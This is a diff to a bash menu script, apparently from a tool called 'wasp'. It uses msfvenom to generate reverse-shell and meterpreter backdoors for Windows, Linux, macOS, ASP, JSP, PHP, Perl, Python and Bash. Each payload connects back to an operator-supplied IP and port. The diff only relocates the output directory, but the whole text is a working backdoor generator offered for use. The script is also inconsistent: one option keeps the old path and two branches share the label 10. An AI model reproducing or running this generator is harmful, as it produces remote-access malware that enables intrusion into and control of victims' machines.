@@ -30,7 +30,7 @@ echo -e "\e[1;31mPlease enter reverse Port:\e[0m"
 read lport
 echo -e "\e[1;31mPlease enter reverse backdoor name:\e[0m"
 read bkname
-mkdir -p payloads
+mkdir -p /usr/share/wasp/payloads
 echo
 echo -e "\e[1;32m1. Payload Windows[$bkname.Exe] .\e[0m"
 echo -e "\e[1;32m2. Payload Linux Binaries[$bkname.Elf] .\e[0m"
@@ -48,16 +48,17 @@ echo -e "\e[1;36m1. Choice.\e[0m"
 read choice
 echo $choice
 case $choice in
-     1) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f exe > payloads/$bkname.exe ;;
-     2) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f elf > payloads/$bkname.elf ;;
-     3) msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lip LPORT=$lport -f macho > payloads/$bkname.macho ;;
-     4) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f asp > payloads/$bkname.asp ;;
-     5) msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.jsp ;;
-     6) msfvenom -p cmd/unix/reverse_perl LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.pl ;;
-     7) msfvenom -p cmd/unix/reverse_python LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.py ;;
-     8) msfvenom -p cmd/unix/reverse_bash LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.sh ;;
+     1) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f exe > /usr/share/wasp/payloads/$bkname.exe ;;
+     2) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f elf > /usr/share/wasp/payloads/$bkname.elf ;;
+     3) msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lip LPORT=$lport -f macho > /usr/share/wasp/payloads/$bkname.macho ;;
+     4) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f asp > /usr/share/wasp/payloads/$bkname.asp ;;
+     5) msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.jsp ;;
+     6) msfvenom -p cmd/unix/reverse_perl LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.pl ;;
+     7) msfvenom -p cmd/unix/reverse_python LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.py ;;
+     8) msfvenom -p cmd/unix/reverse_bash LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.sh ;;
      9) msfvenom -p php/meterpreter_reverse_tcp LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.php ;;
-     10) ./main.sh ;;
+     10) wasp ;;
      10) exit ;;
      *) echo; echo "Invalid choice."; echo
 esac
+
